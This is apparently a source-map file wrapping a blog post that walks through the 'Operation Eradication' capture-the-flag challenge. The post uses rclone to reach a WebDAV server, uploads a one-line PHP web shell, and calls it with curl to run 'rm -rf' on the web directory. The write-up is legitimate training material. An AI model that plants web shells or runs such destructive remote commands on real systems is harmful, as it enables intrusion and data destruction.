{"version":3,"file":"operation_eradication-6Y_VRygr.js","sources":["../../../.svelte-kit/adapter-node/chunks/operation_eradication.js"],"sourcesContent":["import { c as create_ssr_component } from \"./ssr.js\";\nconst metadata = {\n  \"title\": \"Operation Eradication\",\n  \"description\": \"Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don't receive payment!\",\n  \"author\": \"huntress\",\n  \"date\": \"2023-10-14\",\n  \"published\": true\n};\nconst Operation_eradication = create_ssr_component(($$result, $$props, $$bindings, slots) => {\n  return `<h1 data-svelte-h=\"svelte-resiyg\">Operation Eradication</h1> <aside data-svelte-h=\"svelte-148d465\">ðŸ‘» Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don&#39;t receive payment!\n<p><em>They stole our data!</em></p> <p>Luckily, we found what looks like a configuration file, that seems to have credentials to the actorâ€™s storage serverâ€¦ but it doesnâ€™t seem to work. Can you get onto their server and delete all the data they stole!?</p></aside> <p data-svelte-h=\"svelte-1fa4x5\">We are given a webserver instance, alongside an <strong><code>operation_eradication</code></strong> file, which is plain Ascii with the following content:</p> <pre class=\"language-undefined\"><!-- HTML_TAG_START -->${`<code class=\"language-undefined\">type = webdav\nurl = http://localhost/webdav\nvendor = other\nuser = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r\npass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h=\"svelte-64fv4v\">We know this is a <code>Webdav</code> server, and that we can access the Webdav instance at <code>http://chal.ctf.games:30236/webdav</code>. Checking out the main page alongside the Webdav endpoint, we can see the server wants to authenticate with a <code>Basic</code> Authorization header, but no matter what we enter, we cannot access the Webdav service.</p> <p data-svelte-h=\"svelte-1ehhoo\"><img src=\"/img/operation_eradication_img/Untitled.png\" alt=\"1\"></p> <p data-svelte-h=\"svelte-ue5d8c\"><img src=\"/img/operation_eradication_img/Untitled%201.png\" alt=\"Untitled\"></p> <p data-svelte-h=\"svelte-4cp7k9\"><img src=\"/img/operation_eradication_img/Untitled%202.png\" alt=\"Untitled\"></p> <p data-svelte-h=\"svelte-7t7knu\">We can try to do a bit of decoding/decryption, but we wonâ€™t get a hash analysis tool to give us even a guess - our <code>user</code> and <code>pass</code> strings are 72 characters long, arenâ€™t URL-safe b64 encoded, and are generally just not going to be easily cracked.</p> <p data-svelte-h=\"svelte-alhwr1\">Thankfully, we can Google the config template and find that it belongs to <code>Rclone</code>, which can be used to connect to remote Webdav servers.</p> <p data-svelte-h=\"svelte-1lmnfxg\">Downloading Rclone, we can run through a setup of a config file, and then edit itâ€™s contents to match the file provided:</p> <pre class=\"language-powershell\"><!-- HTML_TAG_START -->${`<code class=\"language-powershell\"><span class=\"token punctuation\">.</span>&#92;rclone config\n<span class=\"token comment\"># run through config setup ...</span>\nCurrent remotes:\n\nName                 <span class=\"token function\">Type</span>\n====                 ====\nhuntress             webdav\n\n<span class=\"token comment\"># ...</span>\n\ns<span class=\"token punctuation\">)</span> <span class=\"token function\">Set</span> configuration password\nq<span class=\"token punctuation\">)</span> Quit config\ne/n/d/r/c/s/q> q\n\n<span class=\"token comment\"># then replace it's contents with our desired config:</span>\n\n<span class=\"token function\">echo</span> <span class=\"token string\">\"[huntress]\ntype = webdav\nurl = http://chal.ctf.games:30236/webdav\nvendor = other\nuser = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r\npass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5\"</span> > C:\\\\Users\\\\zacwo\\\\AppData\\\\Roaming&#92;rclone&#92;rclone<span class=\"token punctuation\">.</span>conf\n\n<span class=\"token function\">cat</span> C:\\\\Users\\\\zacwo\\\\AppData\\\\Roaming&#92;rclone&#92;rclone<span class=\"token punctuation\">.</span>conf\n<span class=\"token namespace\">[huntress]</span>\n<span class=\"token function\">type</span> = webdav\nurl = http:<span class=\"token operator\">/</span><span class=\"token operator\">/</span>chal<span class=\"token punctuation\">.</span>ctf<span class=\"token punctuation\">.</span>games:30236/webdav\nvendor = other\nuser = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r\npass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h=\"svelte-10457sn\">Next, lets try listing the Webdavâ€™s contents to see if our configuration works:</p> <pre class=\"language-powershell\"><!-- HTML_TAG_START -->${`<code class=\"language-powershell\"><span class=\"token punctuation\">.</span>&#92;rclone tree huntress:\n<span class=\"token operator\">/</span>\nâ”œâ”€â”€ Accounting\nâ”‚   â”œâ”€â”€ 2021\nâ”‚   â”‚   â””â”€â”€ AnnualReport<span class=\"token punctuation\">.</span>pdf\nâ”‚   â”œâ”€â”€ 2022\nâ”‚   â”‚   â”œâ”€â”€ Quarter1_MonthlyRevenue<span class=\"token punctuation\">.</span>xlsx\n<span class=\"token comment\"># ...</span>\nâ”‚   â””â”€â”€ Training\nâ”‚       â”œâ”€â”€ 2022\nâ”‚       â”‚   â”œâ”€â”€ AdvancedSalesSkillsCourse<span class=\"token punctuation\">.</span>pdf\nâ”‚       â”‚   â””â”€â”€ NewSalesRepTraining<span class=\"token punctuation\">.</span>pdf\nâ”‚       â””â”€â”€ SalesTrainingManual<span class=\"token punctuation\">.</span>pdf</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h=\"svelte-gp0yxr\">Looks like its functional. Unfortunately, we canâ€™t just <code>.\\\\\\\\rclone delete huntress:/</code> - I guess some kind of backend configuration on the remote machine stops us from doing this - we do, however, have write permissions, and can upload files to the machine.</p> <p data-svelte-h=\"svelte-1iojygn\">As with any PHP service, we may be able to gain code execution as <code>www-data</code> (who would usually have ownership of <code>/var/www/html/</code>) so my immediate thoughts were that it might be possible to execute code through malicious PHP.</p> <p data-svelte-h=\"svelte-12vqvs\">We tragically canâ€™t execute commands from our Rclone shell, so weâ€™ll have to try to run something from the HTTP service. As the service is publicly available, only requires a single command, and honestly I donâ€™t feel like spinning up <code>ngrok</code> tunnels, we can just use a PHP <code>cmd</code> script:</p> <pre class=\"language-php\"><!-- HTML_TAG_START -->${`<code class=\"language-php\">// written to 'exec.php':\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>\"</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/pre>\"</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token delimiter important\">?></span></span></code>`}<!-- HTML_TAG_END --></pre> <pre class=\"language-powershell\"><!-- HTML_TAG_START -->${`<code class=\"language-powershell\"><span class=\"token punctuation\">.</span>&#92;rclone <span class=\"token function\">copy</span> C:\\\\<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\\\\exec<span class=\"token punctuation\">.</span>php huntress:<span class=\"token operator\">/</span>\n<span class=\"token punctuation\">.</span>&#92;rclone <span class=\"token function\">ls</span> huntress:<span class=\"token operator\">/</span>\n       50 exec<span class=\"token punctuation\">.</span>php\n  1745724 ProductDevelopment/2022/ProductRoadmap<span class=\"token punctuation\">.</span>pdf\n  3570194 ProductDevelopment/2023/ProductRoadmap<span class=\"token punctuation\">.</span>pdf\n  3510400 HumanResources/EmployeeHandbook<span class=\"token punctuation\">.</span>pdf\n  7680849 ProductDevelopment/Specifications/NewProductSpecs<span class=\"token punctuation\">.</span>pdf\n  3891213 ProductDevelopment/Specifications/UpdatedProductSpecs<span class=\"token punctuation\">.</span>pdf\n  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h=\"svelte-hv4obh\">We still donâ€™t know how to Auth, so we can try to intercept the <code>Rclone</code>â†” <code>Webdav</code> traffic with <code>Wireshark</code>:</p> <pre class=\"language-powershell\"><!-- HTML_TAG_START -->${`<code class=\"language-powershell\">PROPFIND <span class=\"token operator\">/</span>webdav/ HTTP/1<span class=\"token punctuation\">.</span>1\nHost: chal<span class=\"token punctuation\">.</span>ctf<span class=\"token punctuation\">.</span>games:30236\nUser-Agent: rclone/v1<span class=\"token punctuation\">.</span>64<span class=\"token punctuation\">.</span>2\nAuthorization: Basic VkFIeWNZaEsyYXc5VE5GR1NwTWYxYl8yWk5uWnVBTmNJOC0yNmF3R0xZa3dSekp3UF9idU5zWjFlUXdSa21qUW1WenhNZTVyOlN1cGVyRXh0cmVtZWx5U2VjdXJlUGFzc3dvcmRMaWtlQWx3YXlz\nDepth: 1\nReferer: http:<span class=\"token operator\">/</span><span class=\"token operator\">/</span>chal<span class=\"token punctuation\">.</span>ctf<span class=\"token punctuation\">.</span>games:30236/webdav/\nAccept-Encoding: gzip</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h=\"svelte-3c28lo\">Finally, we can use <code>curl</code> to execute <code>bash -c &quot;rm -rf &lt;[the webdav endpoint]&gt;...&quot;;</code>  as a <code>GET</code> param passed to the <code>exec.php</code> file we just uploaded - Iâ€™ve included an additional <code>echo &#39;done&#39;</code> command after running <code>rm -rf</code> just as a sanity check, so we know weâ€™re executing a command given the lack of feedback.</p> <p data-svelte-h=\"svelte-8swnc1\">Essentially, we are querying the URI <code>http://chal.ctf.games:30236/webdav/test/exec.php?cmd=bash+-c+\\\\\\\\&quot;rm+-rf+/var/www/html/webdav/*;+echo+\\\\\\\\&#39;done.\\\\\\\\&#39;\\\\\\\\&quot;</code> while supplying the header info expected for such an HTTP request:</p> <pre class=\"language-bash\"><!-- HTML_TAG_START -->${`<code class=\"language-bash\">\t<span class=\"token function\">curl</span> <span class=\"token parameter variable\">-i</span> <span class=\"token parameter variable\">-s</span> <span class=\"token parameter variable\">-k</span> <span class=\"token parameter variable\">-X</span> <span class=\"token string\">$'GET'</span> <span class=\"token punctuation\"></span><span class=\"token punctuation\"></span>\n    <span class=\"token parameter variable\">-H</span> <span class=\"token string\">$'Host: localhost'</span> <span class=\"token parameter variable\">-H</span> <span class=\"token string\">$'User-Agent: rclone/v1.64.2'</span> <span class=\"token punctuation\"></span><span class=\"token punctuation\"></span>\n    <span class=\"token parameter variable\">-H</span> <span class=\"token string\">$'Authorization: Basic VkFIeWNZaEsyYXc5VE5GR1NwTWYxYl8yWk5uWnVBTmNJOC0yNmF3R0xZa3dSekp3UF9idU5zWjFlUXdSa21qUW1WenhNZTVyOlN1cGVyRXh0cmVtZWx5U2VjdXJlUGFzc3dvcmRMaWtlQWx3YXlz'</span> <span class=\"token punctuation\"></span><span class=\"token punctuation\"></span>\n\t\t<span class=\"token parameter variable\">-H</span> <span class=\"token string\">$'Depth: 1'</span> <span class=\"token parameter variable\">-H</span> <span class=\"token string\">$'Referer: http://chal.ctf.games:30236/webdav/'</span> <span class=\"token parameter variable\">-H</span> <span class=\"token string\">$'Accept-Encoding: gzip'</span> <span class=\"token parameter variable\">-H</span> <span class=\"token string\">$'Content-Type: application/x-httpd-php'</span> <span class=\"token punctuation\"></span><span class=\"token punctuation\"></span>\n    <span class=\"token string\">$'http://chal.ctf.games:30236/webdav/exec.php?cmd=bash+-c+<span class=\"token entity\" title=\"\\\\\">\\\\</span>\"rm+-rf+/var/www/html/webdav/*;+echo+<span class=\"token entity\" title=\"\\\\\">\\\\</span>'</span>done.<span class=\"token punctuation\"></span><span class=\"token punctuation\"></span>'<span class=\"token punctuation\"></span><span class=\"token punctuation\"></span>\"'</code>`}<!-- HTML_TAG_END --></pre> <pre class=\"language-php\"><!-- HTML_TAG_START -->${`<code class=\"language-php\">curl <span class=\"token operator\">-</span>i <span class=\"token operator\">-</span>s <span class=\"token operator\">-</span>k <span class=\"token operator\">-</span><span class=\"token class-name type-declaration\">X</span> $<span class=\"token string single-quoted-string\">'GET'</span> \\\\\n    <span class=\"token operator\">-</span><span class=\"token class-name type-declaration\">H</span> $<span class=\"token string single-quoted-string\">'Host: localhost'</span> <span class=\"token operator\">-</span><span class=\"token class-name type-declaration\">H</span> $<span class=\"token string single-quoted-string\">'User-Agent: rclone/v1.64.2'</span> \\\\\n    <span class=\"token operator\">-</span><span class=\"token class-name type-declaration\">H</span> $<span class=\"token string single-quoted-string\">'Authorization: Basic VkFIeWNZaEsyYXc5VE5GR1NwTWYxYl8yWk5uWnVBTmNJOC0yNmF3R0xZa3dSekp3UF9idU5zWjFlUXdSa21qUW1WenhNZTVyOlN1cGVyRXh0cmVtZWx5U2VjdXJlUGFzc3dvcmRMaWtlQWx3YXlz'</span> \\\\\n\t\t<span class=\"token operator\">-</span><span class=\"token class-name type-declaration\">H</span> $<span class=\"token string single-quoted-string\">'Depth: 1'</span> <span class=\"token operator\">-</span><span class=\"token class-name type-declaration\">H</span> $<span class=\"token string single-quoted-string\">'Referer: http://chal.ctf.games:30236/webdav/'</span> <span class=\"token operator\">-</span><span class=\"token class-name type-declaration\">H</span> $<span class=\"token string single-quoted-string\">'Accept-Encoding: gzip'</span> <span class=\"token operator\">-</span><span class=\"token class-name type-declaration\">H</span> $<span class=\"token string single-quoted-string\">'Content-Type: application/x-httpd-php'</span> \\\\\n    $<span class=\"token string single-quoted-string\">'http://chal.ctf.games:30236/webdav/exec.php?cmd=bash+-c+\\\\\"rm+-rf+/var/www/html/webdav/*;+echo+\\\\'</span>done<span class=\"token operator\">.</span>\\\\<span class=\"token string single-quoted-string\">'\\\\\"'</span>\n\n<span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span> <span class=\"token number\">200</span> <span class=\"token constant\">OK</span>\nDate<span class=\"token punctuation\">:</span> Fri<span class=\"token punctuation\">,</span> <span class=\"token number\">20</span> Oct <span class=\"token number\">2023</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">24</span><span class=\"token punctuation\">:</span><span class=\"token number\">02</span> <span class=\"token constant\">GMT</span>\nServer<span class=\"token punctuation\">:</span> Apache<span class=\"token operator\">/</span><span class=\"token number\">2.4</span><span class=\"token number\">.54</span> <span class=\"token punctuation\">(</span>Debian<span class=\"token punctuation\">)</span>\n<span class=\"token constant\">X</span><span class=\"token operator\">-</span>Powered<span class=\"token operator\">-</span>By<span class=\"token punctuation\">:</span> <span class=\"token constant\">PHP</span><span class=\"token operator\">/</span><span class=\"token number\">7.4</span><span class=\"token number\">.33</span>\nVary<span class=\"token punctuation\">:</span> Accept<span class=\"token operator\">-</span>Encoding\nContent<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> gzip\nTransfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> text<span class=\"token operator\">/</span>html<span class=\"token punctuation\">;</span> charset<span class=\"token operator\">=</span><span class=\"token constant\">UTF</span><span class=\"token operator\">-</span><span class=\"token number\">8</span></code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h=\"svelte-6x8aj4\">Refreshing the webappâ€™s root directory, we get our flag:</p> <p data-svelte-h=\"svelte-1sjkdte\"><img src=\"/img/operation_eradication_img/Untitled%203.png\" alt=\"Untitled\"></p>`;\n});\nexport {\n  Operation_eradication as default,\n  metadata\n};\n"],"names":[],"mappings":";;AACK,MAAC,QAAQ,GAAG;AACjB,EAAE,OAAO,EAAE,uBAAuB;AAClC,EAAE,aAAa,EAAE,gKAAgK;AACjL,EAAE,QAAQ,EAAE,UAAU;AACtB,EAAE,MAAM,EAAE,YAAY;AACtB,EAAE,WAAW,EAAE,IAAI;AACnB,EAAE;AACG,MAAC,qBAAqB,GAAG,oBAAoB,CAAC,CAAC,QAAQ,EAAE,OAAO,EAAE,UAAU,EAAE,KAAK,KAAK;AAC7F,EAAE,OAAO,CAAC;AACV,igBAAigB,EAAE,CAAC;AACpgB;AACA;AACA;AACA,sFAAsF,CAAC,CAAC,i7CAAi7C,EAAE,CAAC;AAC5gD;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,sFAAsF,CAAC,CAAC,0MAA0M,EAAE,CAAC;AACrS;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,iFAAiF,CAAC,CAAC,y/BAAy/B,EAAE,CAAC;AAC/kC;AACA,6lDAA6lD,CAAC,CAAC,oFAAoF,EAAE,CAAC;AACtrD;AACA;AACA;AACA;AACA;AACA;AACA;AACA,iIAAiI,CAAC,CAAC,uQAAuQ,EAAE,CAAC;AAC7Y;AACA;AACA;AACA;AACA;AACA,4BAA4B,CAAC,CAAC,8yBAA8yB,EAAE,CAAC;AAC/0B;AACA;AACA;AACA,+YAA+Y,CAAC,CAAC,6EAA6E,EAAE,CAAC;AACje;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,iVAAiV,CAAC,CAAC,0OAA0O,CAAC,CAAC;AAC/jB,CAAC;;;;"}